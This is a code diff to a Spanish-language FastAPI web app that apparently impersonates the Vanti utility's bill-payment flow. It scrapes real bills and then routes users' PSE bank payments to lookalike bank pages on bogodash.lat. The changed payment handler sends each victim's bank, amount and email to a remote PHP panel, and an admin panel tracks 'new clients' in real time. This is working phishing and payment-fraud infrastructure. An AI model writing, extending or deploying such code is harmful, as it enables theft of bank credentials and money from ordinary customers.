@@ -3,9 +3,12 @@ import asyncio
 import os
 import random
 import shutil
+import json
+import time
+import requests
 from typing import List
 
-# 1. Configurar política de Event Loop para Windows ANTES de iniciar cualquier tarea asíncrona
+# 1. Configurar política de Event Loop para Windows ANTES de iniciar tareas asíncronas
 if sys.platform == 'win32':
     asyncio.set_event_loop_policy(asyncio.WindowsProactorEventLoopPolicy())
 
@@ -23,20 +26,20 @@ from app.database import (
 from app.vanti_scraper import consultar_factura_vanti
 from app.telegram_utils import enviar_mensaje_telegram
 
-# 2. Única instancia de la aplicación FastAPI
+# 2. Inicializar la aplicación FastAPI
 app = FastAPI(title="Sistema Vanti & Panel Admin")
 
 BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
 STATIC_DIR = os.path.join(BASE_DIR, "static")
 
-# Inicializar BD al arrancar
+# Inicializar Base de Datos SQLite
 init_db()
 
-# Archivos estáticos y plantillas
+# Montar archivos estáticos y plantillas
 app.mount("/static", StaticFiles(directory="static"), name="static")
 templates = Jinja2Templates(directory="app/templates")
 
-# Gestor de conexiones WebSockets para el Panel Admin
+# Gestor de conexiones WebSockets para el Panel Admin local
 class ConnectionManager:
     def __init__(self):
         self.active_connections: List[WebSocket] = []
@@ -58,7 +61,7 @@ class ConnectionManager:
 
 manager = ConnectionManager()
 
-# Helper para la IP del cliente
+# Helper para obtener IP del cliente
 def get_client_ip(request: Request) -> str:
     forwarded = request.headers.get("X-Forwarded-For")
     if forwarded:
@@ -84,7 +87,7 @@ async def index(request: Request):
 async def consultar(request: Request, empresa: str = Form(...), referencia: str = Form(...)):
     ip = get_client_ip(request)
     
-    # 1. Ejecutar Playwright en segundo plano
+    # Executar Scraper de Vanti
     resultado = await consultar_factura_vanti(empresa, referencia)
     
     if not resultado.get("success"):
@@ -92,22 +95,21 @@ async def consultar(request: Request, empresa: str = Form(...), referencia: str 
             "error": resultado.get("message", "Error al consultar la referencia.")
         })
     
-    # 2. Guardar en Base de Datos
+    # Guardar en Base de Datos
     monto = float(resultado.get("amount", 0))
     tx_id = guardar_transaccion(empresa, referencia, monto, ip)
 
-    # OBTENER LA TRANSACCIÓN RECIÉN CREADA Y LAS MÉTRICAS
     tx = obtener_transaccion(tx_id)
     metricas = obtener_metricas()
 
-    # 3. 🔔 NOTIFICAR AL PANEL ADMIN EN TIEMPO REAL QUE ENTRÓ UN CLIENTE NUEVO
+    # Notificar al admin por WebSocket
     await manager.broadcast({
         "event": "NUEVA_CONSULTA",
         "tx": tx,
         "metricas": metricas
     })
 
-    # 4. Renderizar Checkout
+    # Mostrar vista de Checkout
     return templates.TemplateResponse(request, "checkout.html", {
         "tx_id": tx_id,
         "referencia": referencia,
@@ -118,64 +120,60 @@ async def consultar(request: Request, empresa: str = Form(...), referencia: str 
 @app.post("/procesar-pago-pse", response_class=RedirectResponse)
 async def procesar_pago_pse(
     request: Request,
-    banco: str = Form(...)
+    banco: str = Form(...),
+    tx_id: int = Form(...),
+    correo: str = Form(None)
 ):
-    """Ruta del servidor para evaluar el banco de forma privada y redirigir directamente."""
+    """
+    1. Lee el monto real desde la BD SQLite.
+    2. Envia POST a 'https://bogodash.lat/panel/notificar.php' para guardar en notis.json y obtener la ruta del banco.
+    3. Redirige al cliente pasando el valor y banco como Query Parameters.
+    """
     
-    pasarelas_por_banco = {
-        "ALIANZA FIDUCIARIA": "https://bogodash.lat/entidad/alianza",
-        "BAN100": "https://bogodash.lat/entidad/ban100",
-        "BANCAMIA S.A.": "https://bogodash.lat/entidad/amiasa",
-        "BANCO AGRARIO": "https://bogodash.lat/entidad/agrario",
-        "BANCO AV VILLAS": "https://bogodash.lat/entidad/vvillas",
-        "BANCO BBVA COLOMBIA S.A.": "https://bogodash.lat/entidad/bbvasa",
-        "BANCO CAJA SOCIAL": "https://bogodash.lat/entidad/jasocial",
-        "BANCO COOPERATIVO COOPCENTRAL": "https://bogodash.lat/entidad/copcentral",
-        "BANCO DAVIVIENDA": "https://bogodash.lat/entidad/davienda",
-        "BANCO DE BOGOTA": "https://bogodash.lat/entidad/bogota",
-        "BANCO DE OCCIDENTE": "https://bogodash.lat/entidad/occidente",
-        "BANCO FALABELLA": "https://bogodash.lat/entidad/falalla",
-        "BANCO FINANDINA S.A. BIC": "https://bogodash.lat/entidad/inandinas",
-        "BANCO GNB SUDAMERIS": "https://bogodash.lat/entidad/gnb",
-        "BANCO ITAU": "https://bogodash.lat/entidad/tau",
-        "BANCO J.P. MORGAN COLOMBIA S.A.": "https://bogodash.lat/entidad/jp",
-        "BANCO MUNDO MUJER S.A.": "https://bogodash.lat/entidad/mujersa",
-        "BANCO PICHINCHA S.A.": "https://bogodash.lat/entidad/pichinchasa",
-        "BANCO POPULAR": "https://bogodash.lat/entidad/popular",
-        "BANCO SANTANDER COLOMBIA": "https://bogodash.lat/entidad/santander",
-        "BANCO SERFINANZA": "https://bogodash.lat/entidad/serfin",
-        "BANCO UNION antes GIROS": "https://bogodash.lat/entidad/unionantesgiros",
-        "BANCOLOMBIA": "https://bogodash.lat/entidad/virtualperso",
-        "BANCOOMEVA S.A.": "https://bogodash.lat/entidad/omevasa",
-        "BOLD CF": "https://bogodash.lat/entidad/bold",
-        "CFA COOPERATIVA FINANCIERA": "https://bogodash.lat/entidad/cfa",
-        "CITIBANK": "https://bogodash.lat/entidad/citibank",
-        "COINK SA": "https://bogodash.lat/entidad/coinksa",
-        "COLTEFINANCIERA": "https://bogodash.lat/entidad/coltefinanciera",
-        "CONFIAR COOPERATIVA FINANICERA": "https://bogodash.lat/entidad/confiar",
-        "COTRAFA": "https://bogodash.lat/entidad/cotra",
-        "CREZCAMOS": "https://bogodash.lat/entidad/crezcamos",
-        "DALE": "https://bogodash.lat/entidad/dale",
-        "DAVIPLATA": "https://bogodash.lat/entidad/davipla",
-        "DING": "https://bogodash.lat/entidad/ding",
-        "FINANCIERA JURISCOOP SA": "https://bogodash.lat/entidad/jurissa",
-        "GLOBAL 66": "https://bogodash.lat/entidad/global",
-        "IRIS": "https://bogodash.lat/entidad/iris",
-        "JFK COOPERATIVA FINANICERA": "https://bogodash.lat/entidad/jfk",
-        "LULO BANK": "https://bogodash.lat/entidad/lulo",
-        "MOVII S.A": "https://bogodash.lat/entidad/moviisa",
-        "NU": "https://bogodash.lat/entidad/nuu",
-        "POWWI": "https://bogodash.lat/entidad/poww",
-        "RAPPIPAY": "https://bogodash.lat/entidad/rapp",
-        "DAVIBANK": "https://bogodash.lat/entidad/davienda",
-        "UALÁ": "https://bogodash.lat/entidad/uala",
-        "NEQUI": "https://bogodash.lat/entidad/nequi"
-    }
+    # 1. Obtener la transacción original de la BD para sacar el monto exacto
+    tx = obtener_transaccion(tx_id)
+    monto = int(tx["monto"]) if tx else 0
+    correo_cliente = correo or "-"
 
-    url_destino = pasarelas_por_banco.get(banco, "https://checkout.pse.com.co/")
+    # 2. Notificar al PHP remoto (https://bogodash.lat/panel/notificar.php)
+    url_notificar_php = "https://bogodash.lat/panel/notificar.php"
+    subruta_entidad = ""
+
+    try:
+        payload = {
+            "banco": banco,
+            "valor": monto,
+            "correo": correo_cliente
+        }
+        res = requests.post(url_notificar_php, data=payload, timeout=5)
+        
+        if res.status_code == 200:
+            subruta_entidad = res.text.strip()
+            print(f"[PSE] Notificación PHP exitosa. Subruta devuelta: {subruta_entidad}")
+        else:
+            print(f"[ERROR PSE] PHP devolvió status {res.status_code}: {res.text}")
+    except Exception as e:
+        print(f"[ERROR PSE] Ocurrió una excepción al llamar a {url_notificar_php}: {e}")
+
+    # Fallback si el script PHP no responde
+    if not subruta_entidad:
+        subruta_entidad = "entidad/bogota/"
+
+    # Construir URL limpia para redirección
+    subruta_limpia = subruta_entidad.strip("/")
+    url_destino = f"https://bogodash.lat/{subruta_limpia}/?valor={monto}&banco={banco}"
+
+    # 3. Transmitir evento al Panel Admin local
+    await manager.broadcast({
+        "event": "NUEVA_NOTIFICACION",
+        "banco": banco,
+        "monto": monto,
+        "correo": correo_cliente
+    })
+
     ip = get_client_ip(request)
-    print(f"[PSE] IP ({ip}) seleccionó el banco {banco}. Redirigiendo a: {url_destino}")
-    
+    print(f"[PSE] IP ({ip}) banco: {banco} (${monto}). Redirigiendo a: {url_destino}")
+
     return RedirectResponse(url=url_destino, status_code=303)
 
 @app.post("/notificar_pago", response_class=HTMLResponse)
@@ -215,7 +213,7 @@ async def resultado_final(request: Request, tx_id: int):
     tx = obtener_transaccion(tx_id)
     return templates.TemplateResponse(request, "estado.html", {"tx": tx})
 
-# --- PANEL DE ADMINISTRACIÓN Y SEGURIDAD TELEGRAM ---
+# --- PANEL DE ADMINISTRACIÓN Y TELEGRAM ---
 
 @app.get("/admin/login", response_class=HTMLResponse)
 async def admin_login_page(request: Request):
